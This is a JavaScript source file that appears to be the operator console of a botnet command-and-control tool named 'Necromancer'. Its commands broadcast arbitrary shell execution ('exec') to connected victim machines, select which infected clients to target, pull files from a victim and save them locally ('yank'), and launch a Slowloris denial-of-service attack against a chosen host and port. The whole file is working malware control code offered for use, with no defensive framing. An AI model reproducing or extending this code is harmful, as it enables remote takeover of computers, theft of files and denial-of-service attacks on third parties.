import readline from "readline";
import fs from "fs";
import { clientModules, broadcast } from "./server.js";

const rl = readline.createInterface({
	input: process.stdin,
	output: process.stdout,
});

let fileNum = 0;

function prompt() {
	rl.question(`\x1b[31m[Necromancer]\x1b[0m `, (message) => {
		message = message.toLowerCase();
		const arg = message.split(" ");

		if (message.startsWith("exec")) broadcast(message);

		if (message.startsWith("instances")) {
			if (message === "instances") {
				console.log(
					`Instances: ${clientModules.clientInstances.length}`
				);
			} else if (arg[1] <= clientModules.clients.length) {
				clientModules.clientInstances = [...clientModules.clients];
				clientModules.clientInstances =
					clientModules.clientInstances.slice(0, arg[1]);
			} else if (arg[1] === "all")
				clientModules.clientInstances = [...clientModules.clients];
		}

		if (message.startsWith("select")) {
			clientModules.clientInstances = [...clientModules.clients];
			clientModules.clientInstances = Array(
				clientModules.clientInstances[arg[1]]
			).filter((i) => i !== undefined);
		}

		if (message.startsWith("silent")) {
			if (message === "silent")
				console.log(`silent: ${clientModules.silent}`);
			else if (arg[1] === "true") {
				clientModules.silent = true;
			} else {
				clientModules.silent = false;
			}
		}

		if (message.startsWith("logging")) {
			if (message === "logging")
				console.log(`logging: ${clientModules.logging}`);
			else if (arg[1] === "true") {
				clientModules.logging = true;
				clientModules.silent = true;
			} else {
				clientModules.logging = false;
				clientModules.silent = false;
			}
		}

		if (message === "clear") console.clear();

		if (message.startsWith("yank")) {
			if (!clientModules.logging) {
				console.log("Please enable logging to use this feature");
				return prompt();
			}
			if (message === "yank")
				console.log("Please provide arugments: yank (file name)");
			else if (clientModules.clientInstances.length > 1) {
				console.log(
					"You can only use this command on one machine at a time"
				);
				return prompt();
			} else if (arg[1] !== undefined) {
				if (clientModules.logging) {
					fileNum++;
					broadcast(message);
				}
			}
		}

		if (message.startsWith("slowloris")) {
			if (message === "slowloris")
				console.log(
					"Please provide arguments: slowloris (host) (port) (duration ms) (sockets)"
				);
			else if (arg[1] !== undefined) {
				broadcast(message);
				console.log(`Attack sent!`);
			}
		}

		if (message === "exit") process.exit(0);

		return prompt();
	});
}

function saveFile(buffer) {
	let timer;
	const writeStream = fs.createWriteStream(`file ${fileNum}`, { flags: "a" });
	let tempBuffer = buffer;

	writeStream.write(buffer);
	if (tempBuffer === buffer) clearTimeout(timer);

	timer = setTimeout(() => {
		writeStream.end();
	}, 3000);
}

export { prompt, saveFile };
